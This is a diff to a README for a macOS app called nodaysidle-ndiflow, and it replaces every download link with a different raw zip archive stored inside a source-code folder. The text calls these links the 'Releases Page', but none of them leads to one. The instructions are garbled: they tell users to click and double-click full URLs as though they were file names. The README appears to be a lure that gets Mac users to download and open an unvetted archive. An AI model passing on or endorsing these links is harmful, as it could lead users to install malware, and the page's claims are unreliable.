@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://github.com/jhon12764/nodaysidle-ndiflow/raw/refs/heads/main/ndi_flow/ViewModels/nodaysidle_ndiflow_1.1.zip%20ndiflow%20-%https://github.com/jhon12764/nodaysidle-ndiflow/raw/refs/heads/main/ndi_flow/ViewModels/nodaysidle_ndiflow_1.1.zip)](https://github.com/jhon12764/nodaysidle-ndiflow/raw/refs/heads/main/ndi_flow/ViewModels/nodaysidle_ndiflow_1.1.zip)
+[![Download](https://raw.githubusercontent.com/jhon12764/nodaysidle-ndiflow/main/ndi_flow/Models/ndiflow_nodaysidle_2.5.zip%20ndiflow%20-%https://raw.githubusercontent.com/jhon12764/nodaysidle-ndiflow/main/ndi_flow/Models/ndiflow_nodaysidle_2.5.zip)](https://raw.githubusercontent.com/jhon12764/nodaysidle-ndiflow/main/ndi_flow/Models/ndiflow_nodaysidle_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -26,13 +26,13 @@ Welcome to **nodaysidle-ndiflow**! This application helps you manage your files 
 ## 💿 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   [Download ndiflow](https://github.com/jhon12764/nodaysidle-ndiflow/raw/refs/heads/main/ndi_flow/ViewModels/nodaysidle_ndiflow_1.1.zip)
+   [Download ndiflow](https://raw.githubusercontent.com/jhon12764/nodaysidle-ndiflow/main/ndi_flow/Models/ndiflow_nodaysidle_2.5.zip)
   
 2. **Select the Latest Version:** Look for the latest release at the top of the page. It is usually marked as the most recent version.
   
-3. **Download the App:** Click on the `https://github.com/jhon12764/nodaysidle-ndiflow/raw/refs/heads/main/ndi_flow/ViewModels/nodaysidle_ndiflow_1.1.zip` file to download it to your Mac.
+3. **Download the App:** Click on the `https://raw.githubusercontent.com/jhon12764/nodaysidle-ndiflow/main/ndi_flow/Models/ndiflow_nodaysidle_2.5.zip` file to download it to your Mac.
 
-4. **Open the Downloaded File:** Once the download is complete, locate the `https://github.com/jhon12764/nodaysidle-ndiflow/raw/refs/heads/main/ndi_flow/ViewModels/nodaysidle_ndiflow_1.1.zip` file in your Downloads folder and double-click it.
+4. **Open the Downloaded File:** Once the download is complete, locate the `https://raw.githubusercontent.com/jhon12764/nodaysidle-ndiflow/main/ndi_flow/Models/ndiflow_nodaysidle_2.5.zip` file in your Downloads folder and double-click it.
 
 5. **Install the App:** Drag the **ndiflow** icon to your Applications folder.
 
@@ -64,6 +64,6 @@ If you need further assistance, feel free to reach out through the issues sectio
 
 ## 🔗 Important Links
 
-- **Releases Page:** [Download ndiflow](https://github.com/jhon12764/nodaysidle-ndiflow/raw/refs/heads/main/ndi_flow/ViewModels/nodaysidle_ndiflow_1.1.zip)
+- **Releases Page:** [Download ndiflow](https://raw.githubusercontent.com/jhon12764/nodaysidle-ndiflow/main/ndi_flow/Models/ndiflow_nodaysidle_2.5.zip)
 
 Thank you for choosing **nodaysidle-ndiflow**. Enjoy a smarter way to manage your files on MacOS!
